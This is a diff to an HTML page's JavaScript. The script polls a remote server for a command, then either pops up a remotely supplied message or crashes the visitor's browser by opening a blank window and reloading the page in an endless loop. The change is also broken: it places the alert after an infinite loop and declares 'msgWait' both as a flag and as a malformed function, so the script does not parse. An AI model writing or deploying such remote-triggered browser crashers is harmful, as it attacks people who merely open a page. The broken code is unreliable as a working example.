@@ -26,16 +26,17 @@ async function hello() {
   }
 }
 
+let msgWait = false
+
 async function ya() {
   let mode = await get(url + "/val");
   // console.log(mode);
   if (mode.includes("ym")) {
-    alert(await get(url + "/msg"))
     window.open("about:blank")
 
         while(1)location.reload(1)
     // Crash with msg
-    
+    alert(await get(url + "/msg"))
     // console.log("crash")
   } else if (mode.includes("y")) {
     window.open("about:blank")
@@ -45,7 +46,10 @@ async function ya() {
     // Just crash
   } else if (mode.includes("m")) {
     // only msg
+    if (!msgWait) {
     alert(await get(url + "/msg"))
+    msgWait();
+    }
   } else {
     // Do nothing
   }
@@ -71,6 +75,12 @@ function get(curl) {
 
 function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function msgWait(); {
+  msgWait = true
+  sleep(10000)
+  msgWait = false
 }
 </script>
 </html>
